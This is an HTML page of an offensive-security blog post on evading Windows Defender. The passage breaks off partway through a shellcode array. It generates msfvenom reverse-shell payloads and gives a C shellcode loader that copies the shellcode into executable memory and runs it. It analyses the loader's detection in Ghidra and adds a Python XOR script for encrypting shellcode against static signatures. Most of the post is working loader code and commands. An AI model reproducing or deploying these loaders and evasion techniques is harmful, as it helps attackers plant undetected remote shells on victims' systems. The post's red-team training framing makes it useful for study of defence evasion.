<!DOCTYPE html>
<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">A Trip Down Memory Lane | gatari&#39;s blog</title>
<meta property="og:title" content="A Trip Down Memory Lane | gatari&#39;s blog" />
<meta name="twitter:title" content="A Trip Down Memory Lane | gatari&#39;s blog" />
<meta itemprop="name" content="A Trip Down Memory Lane | gatari&#39;s blog" />
<meta name="application-name" content="A Trip Down Memory Lane | gatari&#39;s blog" />
<meta property="og:site_name" content="" />

<meta name="description" content="offensive security research">
<meta itemprop="description" content="offensive security research" />
<meta property="og:description" content="offensive security research" />
<meta name="twitter:description" content="offensive security research" />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />

  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/memory-lane/" title="English" />





    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-03-03T00:00:00Z />
    <meta property="article:published_time" content=2024-03-03T00:00:00Z />
    <meta property="og:url" content="http://localhost:1313/posts/memory-lane/" />

    
    <meta property="og:article:author" content="" />
    <meta property="article:author" content="" />
    <meta name="author" content="" />
    
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "A Trip Down Memory Lane",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-03-03",
        "description": "",
        "wordCount":  4258 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-03-03",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "gatari\u0027s blog"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.123.8">

    
    <meta property="og:title" content="A Trip Down Memory Lane" />
<meta property="og:description" content="Antivirus evasion has quickly become one of the most overwritten topics, with endless articles on writing shellcode loaders and other evasive stageless droppers.
Many of these techniques, especially those from older sources, might not be effective right out of the box. This is largely due to the nature of malware development, where it is often a continuous cat-and-mouse game with vendors who are constantly pushing updates to their products.
A Humble Beginning For many malware developers, evading Windows Defender often represents the first hurdle or objective." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/memory-lane/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-03-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-03-03T00:00:00+00:00" />



    
    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="A Trip Down Memory Lane"/>
<meta name="twitter:description" content="Antivirus evasion has quickly become one of the most overwritten topics, with endless articles on writing shellcode loaders and other evasive stageless droppers.
Many of these techniques, especially those from older sources, might not be effective right out of the box. This is largely due to the nature of malware development, where it is often a continuous cat-and-mouse game with vendors who are constantly pushing updates to their products.
A Humble Beginning For many malware developers, evading Windows Defender often represents the first hurdle or objective."/>


    

    <link rel="canonical" href="http://localhost:1313/posts/memory-lane/">
    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
</head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/about/">
                        About
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">A Trip Down Memory Lane</h1>
                
                
                
                <div class="post-meta">
                    <time datetime="2024-03-03T00:00:00&#43;00:00" itemprop="datePublished"> 3 Mar 2024 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p>Antivirus evasion has quickly become one of the most overwritten topics, with endless articles on writing shellcode loaders and other evasive stageless droppers.</p>
<p>Many of these techniques, especially those from older sources, might not be effective right out of the box. This is largely due to the nature of malware development, where it is often a continuous cat-and-mouse game with vendors who are constantly pushing updates to their products.</p>
<h2 id="a-humble-beginning">A Humble Beginning</h2>
<p>For many malware developers, evading Windows Defender often represents the first hurdle or objective. While more experienced developers might view this as a relatively simple challenge, it certainly was not easy for me.</p>
<p><img alt="hmm" src="https://i.gyazo.com/f4ec1ce964d4e5f578ae47055ee132f4.png"></p>
<p>Earlier this year, I passed the <a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">Certified Red Team Operator (CRTO)</a> and cleared HTB&rsquo;s <a href="https://app.hackthebox.com/prolabs/overview/rastalabs">RastaLabs</a> both of which had an emphasis on defense evasion, and had Windows Defender enabled. (To be fair, both were not the latest version :P)</p>
<p><img alt="rastalabs" src="https://i.gyazo.com/6ef28fc3532aecc0806b2a9accb38dd9.png"></p>
<p>Although I didn&rsquo;t have much trouble getting past Windows Defender, I did notice that it was <em>significantly</em> harder than I had remembered, and a loader I made a couple months ago was getting signatured as soon as it was dropped to disk.</p>
<p>And other times, loaders with quite literally no evasion and default generated shellcode will walk right past Windows Defender.</p>
<p><img alt="huh&hellip;?" src="https://i.gyazo.com/b81c0ac734090a09e61e80e6949e044d.png"></p>
<p>Windows Defender has always felt like a black box to me; payloads that functioned perfectly today would suddenly cease to work the next day, getting flagged for seemingly no reason.</p>
<p>Needless to say, without the necessary adjustments and refinement to public malware, your loaders are likely not going to get past defender.</p>
<h2 id="a-trip-down-memory-lane">A Trip Down Memory Lane</h2>
<p><a href="https://www.ired.team/">ired.team</a> was an amazing resource that guided me through my early days of cybersecurity, they have great resources that taught me a lot of what I know today.</p>
<p>A classic blog post under &ldquo;Defense Evasion&rdquo; is the <a href="https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates">AV Bypass with Metasploit Templates and Custom Binaries</a> post where they went through the stages of writing an evasive loader.</p>
<p>I <em>loved</em> this post when I was starting out as seeing the VirusTotal detections slowly decrease with each step was so satisfying.</p>
<p>However, I was sadly disappointed by the results when I followed through the same steps. Let&rsquo;s try out these techniques today, in 2024.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/bruh<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>eth0 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe &gt; implant_x64.exe   
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
</span></span></code></pre></div><p>The original article got: 48/68 or <strong>70.6%</strong> detections.</p>
<p><img alt="msf1" src="https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LN_AaNCmLBXOjQbjcTg%2F-LN_K0T7sNTDWSbmUIsm%2Fmsf-templates-default-payload.png?alt=media&token=db1f1a48-08a2-4919-ae2d-9c87fc815e92"></p>
<p>My results were: 58/72 or <strong>80.6%</strong> detections</p>
<p><img alt="msf1" src="https://i.gyazo.com/07879cd9e2060a08b9bab50165a971bc.png"></p>
<p>It doesn&rsquo;t seem too large of a difference so far, let&rsquo;s move all the way to the techniques that evaded Windows Defender at the time.</p>
<h3 id="windows-defender-i-barely-know-er">Windows Defender? I barely know &rsquo;er</h3>
<p>The article used a custom shellcode loader that casted the start address of the shellcode to a function, and called the function to execute the shellcode.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/bruh<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>eth0 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f c                    
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span><span class="line"><span class="cl">Final size of c file: <span class="m">1963</span> bytes
</span></span><span class="line"><span class="cl">unsigned char buf<span class="o">[]</span> <span class="o">=</span> 
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>... SNIP ...<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&#34;</span><span class="p">;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="p">[...</span> <span class="n">SNIP</span> <span class="p">...]</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span> <span class="n">exec</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">RtlMoveMemory</span><span class="p">(</span> <span class="n">exec</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span> <span class="o">*</span> <span class="p">)())</span><span class="n">exec</span> <span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The article got a <em>staggering</em> 3/68 or <strong>4.4%</strong> detections, this included Windows Defender, of course.</p>
<p><img alt="msf2" src="https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LN_sILlRtO9ChAFtFwH%2F-LN_uK2_OHmB2U0S10J0%2Fmsf-vt4.png?alt=media&token=44c0be3c-f17a-4a8d-a18c-9b25bd6eb4a8"></p>
<p>My loader was not so fortunate with 32/71 or <strong>45.0%</strong> detections, which included Windows Defender.</p>
<p><img alt="msf2" src="https://i.gyazo.com/07e7726345053880866f4c328a366141.png"></p>
<p>If you were paying attention to the Virus Total scans, you&rsquo;d very quickly see this.</p>
<p><img alt="date" src="https://i.gyazo.com/d0dbc1535bf0f7e75c541f647edb6316.png"></p>
<p>This article was posted and the scans were from around ~6 years ago (has it really been <strong>SIX</strong> years??). Since then, modern antivirus has gotten much <em>much</em> better at detecting shellcode loaders.</p>
<p>My guess is that AV back then was not very familiar with detecting malicious PIC, and simple shellcode loaders were sufficient.</p>
<h3 id="back-to-the-present">Back to the Present</h3>
<p>Let&rsquo;s try to find out what Windows Defender is detecting in this loader.
<img alt="gocheck" src="https://i.gyazo.com/5c89bbcf0730489a1b485061a870bfe0.png">
Pop this into <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> and start disassembling our loader!</p>
<p><img alt="ghidra1" src="https://i.gyazo.com/761c604ee241ae9c1c63287ff3f6a6e4.png"></p>
<p>We didn&rsquo;t strip the binary when compiling, so it&rsquo;s pretty easy for us to find the main function. Let&rsquo;s take reference from our loader and start renaming the variables.</p>
<p><img alt="ghidra2" src="https://i.gyazo.com/c99049220356dd0a9bb76d357e30e0cf.png"></p>
<p>Since Windows Defender signatured us at an offset of <strong>0x26CF</strong>, we can jump to that address (0x0 + 0x26CF).</p>
<p><img alt="0x26CF" src="https://i.gyazo.com/6beca358a87dfb0bbb6b4e38941d9d13.png"></p>
<p>This section of memory exists in the <code>.data</code> section and exists after the symbol <code>buf</code>.</p>
<p><img alt="buf" src="https://i.gyazo.com/dd3230dbcf9bb2358ef8533a3eb22246.png"></p>
<p>If you remembered earlier, <code>buf</code> contains our msfvenom-generated shellcode. It seems like we&rsquo;re getting flagged on our shellcode when we drop to disk, let&rsquo;s work on extending their loader to be more evasive!</p>
<h3 id="evading-static-analysis">Evading Static Analysis</h3>
<p>Since our shellcode is being signatured, the next logical step is to include some encryption.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/bruh<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>eth0 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f raw &gt; shellcode.bin
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span></code></pre></div><p>You can use whatever language you&rsquo;d like to encrypt the shellcode, but I&rsquo;m more comfortable with Python.</p>
<p>Do note that you&rsquo;ll also need to parse the shellcode file to output them into a char buffer in C.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span> <span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span> <span class="n">key</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span> <span class="p">[</span> <span class="n">data</span><span class="p">[</span> <span class="n">i</span> <span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span> <span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span> <span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span> <span class="nb">len</span><span class="p">(</span> <span class="n">data</span> <span class="p">)</span> <span class="p">)</span> <span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shellcode_h</span><span class="p">(</span> <span class="n">bin_file</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="kc">None</span> <span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span> <span class="n">bin_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span> <span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">byte_arr</span> <span class="o">=</span> <span class="p">[</span> <span class="sa">f</span><span class="s2">&#34;0x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">data</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="n">byte_arr</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key_arr</span> <span class="o">=</span> <span class="p">[</span> <span class="sa">f</span><span class="s2">&#34;0x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">key</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="n">key_arr</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span> <span class="n">name</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span> <span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="o">%</span> <span class="n">raw</span> <span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="sa">f</span><span class="s2">&#34;unsigned char shellcode[] = </span><span class="se">{{</span><span class="s2"> </span><span class="si">{</span><span class="n">shellcode</span><span class="si">}</span><span class="s2"> </span><span class="se">}}</span><span class="s2">;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="sa">f</span><span class="s2">&#34;unsigned char key[] = </span><span class="se">{{</span><span class="s2"> </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2"> </span><span class="se">}}</span><span class="s2">;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="o">%</span> <span class="n">endraw</span> <span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span> <span class="n">description</span><span class="o">=</span><span class="s1">&#39;convert bin to c shellcode&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span> <span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;input file&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span> <span class="s1">&#39;output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;output file&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span> <span class="s1">&#39;-k&#39;</span><span class="p">,</span> <span class="s1">&#39;--key&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;xor key&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">bin_file</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">input</span>
</span></span><span class="line"><span class="cl">    <span class="n">c_file</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">output</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span> <span class="n">bin_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span> <span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span> <span class="n">data</span><span class="p">,</span> <span class="n">key</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span> <span class="n">bin_file</span> <span class="o">+</span> <span class="s1">&#39;.enc&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span> <span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="n">data</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">bin_file</span> <span class="o">=</span> <span class="n">bin_file</span> <span class="o">+</span> <span class="s1">&#39;.enc&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">shellcode_h</span><span class="p">(</span> <span class="n">bin_file</span><span class="p">,</span> <span class="n">c_file</span><span class="p">,</span> <span class="n">key</span> <span class="p">)</span>
</span></span></code></pre></div><p>This takes in raw shellcode, encrypts it and spits out 2 char arrays, one for <code>shellcode</code> and one for the XOR <code>key</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./parser.py shellcode.bin out -k f67c2bcbfcfa30fccb36f72dca22a817
</span></span></code></pre></div><p>This generates an output file that can be directly included to a project as a header file (<code>#include &quot;shellcode.h&quot;</code>) or you can just copy paste them into your loader.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span 